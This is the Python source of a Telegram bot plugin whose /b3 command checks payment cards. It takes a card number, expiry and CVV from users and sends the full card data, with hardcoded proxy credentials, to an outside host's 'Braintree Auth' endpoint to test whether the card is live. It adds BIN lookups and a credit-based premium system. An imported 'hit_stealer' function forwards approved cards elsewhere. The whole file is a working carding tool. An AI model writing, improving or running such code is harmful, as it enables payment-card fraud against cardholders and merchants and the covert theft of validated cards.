from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests, re, time
from plugins.func.users_sql import *
from datetime import date
from plugins.tools.hit_stealer import send_hit_if_approved  # ADD THIS

session = requests.Session()

@Client.on_message(filters.command("b3", prefixes=["/", "."]))
async def cmd_b3(Client, message):
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        chat_type = str(message.chat.type).lower()
        username = message.from_user.username or "None"

        regdata = fetchinfo(user_id)
        if not regdata:
            insert_reg_data(user_id, username, 0, str(date.today()))
            regdata = fetchinfo(user_id)

        role = regdata[2] or "FREE"
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type == "private" and role == "FREE":
            return await message.reply_text(
                "Premium Users Only.\nJoin our group for access:",
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("Join Group", url="https://t.me/BarryxChat")]]
                ),
                disable_web_page_preview=True
            )

        if chat_type in ["group", "supergroup"] and str(chat_id) not in GROUP:
            return await message.reply_text("Unauthorized chat. Contact admin.", message.id)

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.", message.id)

        if now - antispam_time < wait_time:
            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)", message.id)

        args = message.text.split(None, 1)
        if len(args) < 2 and not message.reply_to_message:
            return await message.reply_text("❌ Usage: /b3 <cc|mm|yy|cvv>", message.id)

        cc = message.reply_to_message.text if message.reply_to_message else args[1].strip()
        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc)
        if not match:
            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv", message.id)

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply_text(f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Braintree Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...
""", reply_to_message_id=message.id)

        tic = time.perf_counter()

        try:
            proxy = "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8"
            url = f"http://luckyxd.biz:1234/auth?cc={fullcc}&proxy={proxy}"
            res = session.get(url, timeout=50)
            data = res.json()
            card_status = data.get("status", "").lower()
            card_message = data.get("result") or data.get("message") or res.text or "❌ No response message."
        except Exception as e:
            card_status = "error"
            card_message = f"❌ Request failed: {str(e)}"

        toc = time.perf_counter()

        # BIN Lookup from Voidex
        bin_ = ccnum[:6]
        brand = type_ = level = bank = country = flag = "N/A"

        try:
            bin_res = session.get(f"https://api.voidex.dev/api/bin?bin={bin_}", timeout=10).json()
            brand = bin_res.get("scheme") or bin_res.get("vendor") or brand
            type_ = bin_res.get("type") or type_
            level = bin_res.get("level") or bin_res.get("brand") or level
            bank = bin_res.get("bank") or bank
            country = bin_res.get("country_name") or country
            flag = bin_res.get("country_flag") or flag
        except:
            pass

        brand, type_, level, bank, country = [str(i or "N/A").upper() for i in [brand, type_, level, bank, country]]
        flag = flag or "N/A"

        # Handle LIVE keywords
        live_keywords = ["avs", "duplicate", "already exists", "cvc", "zip"]
        if any(kw in card_message.lower() for kw in live_keywords):
            status = "Approved ✅"
        elif card_status == "success":
            status = "Approved ✅"
        else:
            status = "Declined ❌"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Braintree Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ BIN Info:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""
        await Client.edit_message_text(chat_id, check_msg.id, final_msg)

        # ADD THIS LINE TO FORWARD HIT
        await send_hit_if_approved(Client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
